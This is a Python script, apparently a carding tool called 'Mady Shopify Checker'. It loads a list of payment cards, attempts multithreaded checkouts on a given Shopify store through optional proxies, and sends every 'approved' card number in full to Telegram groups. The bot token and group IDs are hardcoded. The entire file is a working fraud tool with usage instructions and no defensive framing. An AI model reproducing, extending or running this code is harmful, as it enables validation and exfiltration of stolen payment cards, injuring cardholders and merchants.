#!/usr/bin/env python3
"""
Mady Shopify Checker - Auto-checkout on Shopify stores
Finds cheapest product and attempts checkout with cards
"""

import sys
import os
import time
import requests
import threading
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
import argparse

# Add core path
sys.path.insert(0, os.path.dirname(__file__))
from core.shopify_gateway import ShopifyGateway

BOT_TOKEN = "7984658748:AAFLNS52swKHJkh4kWuu3LDgckslaZjyJTY"
GROUP_IDS = ["-1003546431412"]
BOT_CREDIT = "@MissNullMe"

# Stats tracking
class Stats:
    def __init__(self):
        self.approved = 0
        self.declined = 0
        self.errors = 0
        self.total = 0
        self.start_time = None
        self.lock = threading.Lock()
    
    def update(self, status):
        with self.lock:
            if status == "approved":
                self.approved += 1
            elif status == "declined":
                self.declined += 1
            else:
                self.errors += 1

stats = Stats()

def send_to_telegram(message, silent=True):
    """Send message to all Telegram groups"""
    success = False
    for group_id in GROUP_IDS:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        data = {
            'chat_id': group_id,
            'text': message,
            'parse_mode': 'HTML',
            'disable_notification': silent
        }
        
        try:
            response = requests.post(url, data=data, timeout=10)
            if response.status_code == 200:
                success = True
        except:
            pass
    return success

def check_single_card(card, gateway, index, total, proxy=None):
    """Check a single card"""
    try:
        status, message, card_type = gateway.check(card, proxy)
        
        # Update stats
        stats.update(status)
        
        # Format output
        if status == "approved":
            symbol = "✅"
            color_code = "\033[92m"  # Green
        elif status == "declined":
            symbol = "❌"
            color_code = "\033[91m"  # Red
        else:
            symbol = "⚠️"
            color_code = "\033[93m"  # Yellow
        
        reset_code = "\033[0m"
        
        # Print result
        print(f"{color_code}{symbol} [{index}/{total}]: {card} - {message} [{card_type}]{reset_code}")
        
        # Send approved cards to Telegram
        if status == "approved":
            telegram_msg = (
                f"<b>✅ SHOPIFY APPROVED</b>\n"
                f"━━━━━━━━━━━━━━━━\n"
                f"<b>Card:</b> <code>{card}</code>\n"
                f"<b>Store:</b> {gateway.store_url}\n"
                f"<b>Response:</b> {message}\n"
                f"<b>Type:</b> {card_type}\n"
                f"━━━━━━━━━━━━━━━━\n"
                f"<b>Bot by {BOT_CREDIT}</b>"
            )
            send_to_telegram(telegram_msg, silent=False)
        
        return status
        
    except Exception as e:
        stats.update("error")
        print(f"⚠️ [{index}/{total}]: {card} - Error: {str(e)[:50]}")
        return "error"

def process_batch(cards, store_url, threads=5, proxy=None):
    """Process a batch of cards"""
    total = len(cards)
    stats.start_time = time.time()
    stats.total = total
    
    print(f"\n{'='*60}")
    print(f"Starting Shopify checker...")
    print(f"Store: {store_url}")
    print(f"Cards: {total:,}")
    print(f"Threads: {threads}")
    if proxy:
        print(f"Proxy: {proxy}")
    print(f"{'='*60}\n")
    
    # Create gateway
    gateway = ShopifyGateway(store_url)
    
    # Process cards
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = []
        for i, card in enumerate(cards, 1):
            future = executor.submit(check_single_card, card, gateway, i, total, proxy)
            futures.append(future)
            time.sleep(0.1)  # Small delay between submissions
        
        # Wait for completion
        for future in futures:
            future.result()
    
    # Final stats
    elapsed = time.time() - stats.start_time
    print(f"\n{'='*60}")
    print(f"RESULTS:")
    print(f"  ✅ Approved: {stats.approved}")
    print(f"  ❌ Declined: {stats.declined}")
    print(f"  ⚠️ Errors: {stats.errors}")
    print(f"  Total: {stats.total}")
    print(f"  Time: {elapsed:.1f}s")
    print(f"  Rate: {stats.total/elapsed:.1f} cards/sec")
    if gateway.success_count + gateway.fail_count > 0:
        print(f"  Success Rate: {gateway.get_success_rate():.1f}%")
    print(f"{'='*60}\n")
    
    # Send summary to Telegram
    summary_msg = (
        f"<b>📊 SHOPIFY CHECKER SUMMARY</b>\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"<b>Store:</b> {store_url}\n"
        f"<b>Total Cards:</b> {stats.total}\n"
        f"<b>✅ Approved:</b> {stats.approved}\n"
        f"<b>❌ Declined:</b> {stats.declined}\n"
        f"<b>⚠️ Errors:</b> {stats.errors}\n"
        f"<b>⏱ Time:</b> {elapsed:.1f}s\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"<b>Bot by {BOT_CREDIT}</b>"
    )
    send_to_telegram(summary_msg)

def main():
    parser = argparse.ArgumentParser(
        description='Mady Shopify Checker - Auto-checkout on Shopify stores',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 mady_shopify_checker.py cards.txt --store example.myshopify.com
  python3 mady_shopify_checker.py cards.txt --store shop.example.com --threads 3
  python3 mady_shopify_checker.py cards.txt --store example.com --limit 10
  python3 mady_shopify_checker.py cards.txt --store example.com --proxy ip:port:user:pass
        """
    )
    
    parser.add_argument('file', help='Path to card file')
    parser.add_argument('-s', '--store', required=True,
                       help='Shopify store URL (e.g., example.myshopify.com)')
    parser.add_argument('-t', '--threads', type=int, default=5,
                       help='Number of threads (default: 5, max: 10)')
    parser.add_argument('-l', '--limit', type=int, default=0,
                       help='Limit number of cards (0 = no limit)')
    parser.add_argument('-p', '--proxy', type=str, default=None,
                       help='Proxy in format ip:port:user:pass')
    
    args = parser.parse_args()
    
    # Validate threads
    if args.threads > 10:
        print("⚠️ Warning: Max 10 threads for Shopify to avoid rate limiting")
        args.threads = 10
    
    # Check file
    if not os.path.exists(args.file):
        print(f"❌ Error: File not found: {args.file}")
        sys.exit(1)
    
    # Load cards
    print(f"📁 Loading cards from: {args.file}")
    with open(args.file, 'r') as f:
        lines = f.readlines()
    
    cards = [line.strip() for line in lines if line.strip() and '|' in line]
    
    if not cards:
        print("❌ Error: No valid cards found")
        sys.exit(1)
    
    print(f"✅ Loaded {len(cards):,} cards")
    
    # Apply limit
    if args.limit > 0:
        cards = cards[:args.limit]
        print(f"📌 Limited to {len(cards):,} cards")
    
    # Confirm large batches
    if len(cards) > 100:
        print(f"\n⚠️ WARNING: Large batch of {len(cards):,} cards")
        print(f"Estimated time: ~{len(cards)/args.threads*2:.0f} seconds")
        response = input("Continue? (y/n): ")
        if response.lower() != 'y':
            print("Cancelled.")
            sys.exit(0)
    
    # Process
    try:
        process_batch(cards, args.store, args.threads, args.proxy)
    except KeyboardInterrupt:
        print(f"\n\n⛔ Interrupted! Processed {stats.approved + stats.declined + stats.errors}/{len(cards)} cards")
        print(f"✅ Approved: {stats.approved} | ❌ Declined: {stats.declined}")

if __name__ == "__main__":
    print("""
╔════════════════════════════════════════════════════════════╗
║              MADY SHOPIFY AUTO-CHECKOUT CHECKER           ║
║           Find Cheapest Product & Auto-Checkout           ║
║                   Telegram Integration                    ║
║                    Bot by @MissNullMe                     ║
╚════════════════════════════════════════════════════════════╝
""")
    
    if len(sys.argv) == 1:
        print("Usage: python3 mady_shopify_checker.py <file> --store <store_url> [options]")
        print("\nQuick Start:")
        print("  python3 mady_shopify_checker.py cards.txt --store example.myshopify.com")
        print("\nOptions:")
        print("  -s, --store     Shopify store URL (required)")
        print("  -t, --threads   Number of threads (default: 5)")
        print("  -l, --limit     Limit cards to check")
        print("  -p, --proxy     Proxy (ip:port:user:pass)")
        print("\nRun with --help for more info")
        sys.exit(0)
    
    main()
